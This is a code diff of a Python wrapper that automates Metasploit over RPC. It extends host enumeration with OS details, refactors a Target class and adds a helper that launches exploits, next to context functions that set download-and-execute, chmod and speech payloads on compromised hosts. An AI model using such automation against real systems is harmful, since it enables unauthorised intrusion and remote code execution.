@@ -13,7 +13,7 @@ def strip_whitespaces(str):
 
 def host_table(client):
     hosts = []
-    response = str(client.console_execute('hosts -c address,mac')) # TODO add more ?
+    response = str(client.console_execute('hosts -c address,mac,os_name,os_flavor')) # TODO add more ?
     while not 'Hosts' in response:
         sleep(10)
         response = client.console_read()
@@ -21,13 +21,13 @@ def host_table(client):
     for row in response:
         row = strip_whitespaces(row)
         row = row.split(' ')
-        hosts.append({'ip': row[0], 'mac': row[1]}) # ip address, mac address
+        hosts.append({'ip': row[0], 'mac': row[1], 'os_name': row[2], 'os_flavor': row[3]}) # ip address, mac address
     return hosts
 
 
 class Target(object):
-    def __init__(self, username, password, ip, mac):
-        self.client = clients.metasploit.MSFClient(password, username=username)
+    def __init__(self, client, ip, mac):
+        self.client = client
         self.ip = ip
         self.mac = mac
         self.services = []
@@ -252,7 +252,6 @@ def chmod(client, file, payloads):
     client.console_execute('set PAYLOAD {0}\n'.format(payloads['cm']))
     client.console_execute('set FILE {0}\n'.format(file))
 
-
 def dl_exec(client, url, name, payloads):
     client.console_execute('set PAYLOAD {0}\n'.format(payloads['de']))
     client.console_execute('set URL {0}\n'.format(url))
@@ -289,6 +288,10 @@ def speak(client, payloads):
 def say(client, text, payloads):
     client.console_execute('set PAYLOAD {0}\n'.format(payloads['sy']))
     client.console_execute('set TEXT {0}\n'.format(text))
+
+
+def run_single(client):
+    client.console_execute('exploits')
 
 # session management
 
